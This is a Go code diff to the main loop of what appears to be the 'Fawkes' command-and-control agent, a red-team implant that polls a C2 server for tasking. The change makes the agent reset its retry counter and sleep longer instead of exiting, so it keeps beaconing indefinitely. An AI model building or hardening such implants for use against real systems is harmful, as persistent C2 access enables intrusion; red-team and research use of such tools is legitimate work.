@@ -9,7 +9,6 @@ import (
 	"os/signal"
 	"strconv"
 	"strings"
-	"sync"
 	"syscall"
 	"time"
 
@@ -131,21 +130,16 @@ func main() {
 	}()
 
 	// Start main execution loop
-	var wg sync.WaitGroup
-	wg.Add(1)
+	go mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
 
-	go func() {
-		defer wg.Done()
-		mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
-	}()
-
-	// Wait for shutdown signal or completion
-	wg.Wait()
+	// Wait for shutdown signal
+	<-ctx.Done()
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
 func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
+	log.Printf("[DEBUG] MainLoop parameters: maxRetries=%d, sleepInterval=%d, debug=%v", maxRetriesInt, sleepIntervalInt, debugBool)
 
 	// Main execution loop
 	retryCount := 0
@@ -158,6 +152,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 			log.Printf("[INFO] Context cancelled, exiting main loop")
 			return
 		default:
+			log.Printf("[DEBUG] Main loop iteration starting (retry count: %d)", retryCount)
 			if debugBool {
 				log.Printf("[DEBUG] Calling GetTasking...")
 			}
@@ -167,8 +162,15 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 				log.Printf("[ERROR] Failed to get tasking: %v", err)
 				retryCount++
 				if retryCount >= maxRetriesInt {
-					log.Printf("[ERROR] Maximum retry count reached, exiting")
-					return
+					log.Printf("[ERROR] Maximum retry count reached, resetting counter and sleeping longer")
+					retryCount = 0 // Reset counter instead of exiting
+					// Sleep longer on repeated failures
+					sleepTime := time.Duration(agent.SleepInterval*3) * time.Second
+					if debugBool {
+						log.Printf("[DEBUG] Sleeping for extended time %v after max retries", sleepTime)
+					}
+					time.Sleep(sleepTime)
+					continue
 				}
 				// Use the same sleep calculation for error case
 				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
